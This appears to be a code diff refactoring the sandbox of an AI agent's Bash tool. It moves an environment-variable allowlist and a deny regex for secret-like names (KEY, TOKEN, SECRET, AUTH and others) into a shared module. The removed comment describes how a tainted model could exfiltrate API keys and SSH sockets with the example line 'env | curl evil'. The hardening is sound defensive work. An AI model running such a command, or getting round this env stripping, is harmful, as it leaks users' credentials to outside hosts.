@@ -19,6 +19,7 @@
 import type { ToolContext } from "../context.js";
 import { createOffBackend } from "../sandbox/off.js";
 import { safeSpawnShell } from "../../runtime/safe-spawn.js";
+import { buildSandboxEnv } from "../../runtime/spawn-common.js";
 import type { ToolDefinition } from "../../types.js";
 
 export const bashToolDef: ToolDefinition = {
@@ -47,53 +48,10 @@ export const bashToolDef: ToolDefinition = {
 const MAX_OUTPUT = 100_000;
 const MAX_BUFFER = 10 * 1024 * 1024;
 
-/**
- * Env vars that are always safe to forward into the sandboxed shell. We pass
- * through enough for common Unix tooling (locale, PATH, HOME, terminal width)
- * but strip everything else. The Bash tool is the only thing the LLM can
- * directly steer at the shell, and a tainted model with full env access can
- * trivially exfiltrate `OPENROUTER_API_KEY` / `AWS_*` / `SSH_AUTH_SOCK` via
- * `env | curl evil`. Filesystem-level deniedReads don't help once secrets are
- * already in the process environment.
- *
- * `off` backend keeps the historical full-passthrough behavior — the user
- * explicitly opted out of sandboxing.
- */
-const ENV_ALLOWLIST = new Set([
-  "PATH",
-  "HOME",
-  "USER",
-  "LOGNAME",
-  "SHELL",
-  "LANG",
-  "LC_ALL",
-  "LC_CTYPE",
-  "TERM",
-  "TMPDIR",
-  "TZ",
-  "COLUMNS",
-  "LINES",
-  "PWD",
-]);
-
-/**
- * Names matching these patterns are dropped even if they appear in the
- * allowlist (defense in depth — e.g. a user setting `PATH_TOKEN` shouldn't
- * leak just because it starts with `PATH`). Match is case-insensitive on
- * the full name.
- */
-const ENV_DENY_REGEX = /(KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|SESSION|AUTH|COOKIE|PRIVATE)/i;
-
-function buildSandboxEnv(): NodeJS.ProcessEnv {
-  const out: NodeJS.ProcessEnv = {};
-  for (const name of ENV_ALLOWLIST) {
-    const v = process.env[name];
-    if (v !== undefined && !ENV_DENY_REGEX.test(name)) {
-      out[name] = v;
-    }
-  }
-  return out;
-}
+// The env allowlist / deny regex that hardens a sandboxed shell now lives in
+// runtime/spawn-common.ts so foreground (this tool) and background shells
+// share one source of truth. The `off` backend keeps the historical
+// full-passthrough behavior — the user explicitly opted out of sandboxing.
 
 export async function bashTool(
   args: Record<string, unknown>,
